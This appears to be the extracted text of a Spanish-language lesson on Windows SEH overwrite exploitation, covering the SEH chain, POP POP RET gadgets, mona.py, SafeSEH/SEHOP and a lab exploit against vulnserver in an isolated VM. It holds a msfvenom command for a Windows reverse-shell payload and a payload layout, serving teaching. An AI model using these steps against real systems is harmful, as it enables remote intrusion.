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129 — Explotación en Windows: manejo de SEH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Trasladar los conceptos de explotación al mundo Windows, centrándote en el mecanismo de manejo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estructurado de excepciones (SEH) y en cómo un overflow que corrompe la cadena SEH permite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secuestrar el flujo pese a algunas mitigaciones. Verás el uso de POP POP RET, la técnica clásica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sobrescritura de SEH y cómo SafeSEH/SEHOP la complican.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cadena SEH: EXCEPTIONREGISTRATIONRECORD (next + handler).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el ataque de sobrescritura de SEH y el rol de POP POP RET.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x64dbg/WinDbg y mona.py para localizar offsets y gadgets.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SafeSEH, SEHOP y DEP/ASLR como mitigaciones y su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exploit SEH sobre un servicio vulnerable de laboratorio.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Modelo de excepciones de Windows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Cadena SEH y sus campos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Sobrescritura de SEH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POP POP RET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mona.py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SafeSEH / SEHOP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DEP/ASLR en Windows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Aunque los fundamentos —controlar el flujo tras un overflow— son universales, Windows tiene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arquitectura de manejo de errores propia que abre una vía de explotación característica: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Structured Exception Handling (SEH). En Windows, cuando ocurre una excepción (un acceso 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memoria inválido, una división por cero), el sistema no aborta de inmediato: recorre una cadena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manejadores de excepciones registrados, dándole a cada uno la oportunidad de tratar el error. Esa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cadena vive en la pila, y ahí está la vulnerabilidad: un overflow que la alcance puede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secuestrar el manejador, de modo que la próxima excepción salte a código del atacante.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SEH (Structured Exception Handling): mecanismo de Windows con una lista enlazada de manejadores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el stack. Clave: cada registro tiene next y handler.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Sobrescritura de SEH: el overflow sobrescribe handler (y next) para desviar la ejecución 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disparar una excepción. Clave: útil cuando el overflow es mayor que la distancia al retorno.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POP POP RET: gadget que, al invocarse el handler, salta a nSEH (los 4 bytes previos), donde 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coloca un short jmp al shellcode. Clave: técnica canónica de SEH.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SafeSEH: lista blanca de handlers válidos por módulo. Clave: obliga a usar un POP POP RET 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SEH — Structured Exception Handling de Windows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Excepción — Error (acceso inválido, división por cero) que dispara el manejo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Cadena SEH — Lista de manejadores registrados, en la pila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nSEH — Puntero al siguiente registro de la cadena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Handler — Puntero a la función manejadora de esta entrada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SEH overwrite — Sobrescribir nSEH y Handler con un overflow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una VM Windows aislada (sin red hacia producción):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x64dbg o WinDbg (con la extensión de mona en Immunity Debugger clásico).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mona.py de Corelan.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vulnserver como objetivo de práctica legal.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pwntools/python para enviar el payload por socket.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Lanza vulnserver y conéctate con nc/pwntools; identifica el comando vulnerable (p. ej. GMON).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Provoca el crash enviando una cadena larga y observa en el debugger que la cadena SEH se sobrescribe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(ver SEH chain).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 el offset a nSEH/SEH con un patrón cíclico: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un POP POP RET en un módulo sin SafeSEH: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el payload: [relleno][nSEH: short jmp][SEH: dir POP POP RET][NOPs][shellcode].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shellcode con msfvenom -p windows/shellreversetcp LHOST=&lt;vm&gt; LPORT=4444 -f python (para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los badchars del servicio con !mona bytearray y compara memoria.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se salta primero a nSEH y no directamente al shellcode.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 módulo sin SafeSEH en el proceso con !mona modules.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Sustituye el short jmp por un egghunter cuando el espacio es escaso.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cómo SEHOP rompería tu cadena y qué haría falta.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Adapta el shellcode para evitar un badchar concreto (\x00, \x0a).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 vulnserver en tu VM, consigue ejecución de código mediante sobrescritura de SEH y recibe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shell en tu listener local.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tu listener recibe una shell del proceso vulnserver; el payload usa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POP POP RET de un módulo sin SafeSEH y un short jmp en nSEH.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handler no se ejecuta — No se disparó la excepción; asegura corromper la cadena SEH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POP POP RET rechazado — El módulo tiene SafeSEH; elige otro con !mona seh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Shellcode truncado — Badchars presentes; regenera evitándolos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Short jmp cae en basura — Distancia de salto mal calculada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Funciona sin DEP, no con DEP — Necesitas ROP para marcar memoria ejecutable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SEH en vez del ret clásico? Cuando el overflow es grande, corromper SEH suele ser más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fiable que alcanzar el retorno directo.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¿Sigue siendo relevante? En software legacy y algunos servicios sí; en binarios modernos con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SafeSEH+SEHOP+DEP+ASLR es mucho más difícil.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¿mona funciona en WinDbg moderno? Está pensado para Immunity/WinDbg; existen ports. Muchos usan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x64dbg + scripts propios hoy.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Corelan, "Exploit writing tutorial part 3: SEH" — &lt;https://www.corelan.be/&gt;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Shellcoder's Handbook, parte de Windows. Wiley.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vulnserver (Stephen Bradshaw) — &lt;https://github.com/stephenbradshaw/vulnserver&gt;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Microsoft, SEH docs — &lt;https://learn.microsoft.com/windows/win32/debug/structured-exception-handling&gt;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eb092a71bf790f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710" y="1097280"/>
            <a:ext cx="177858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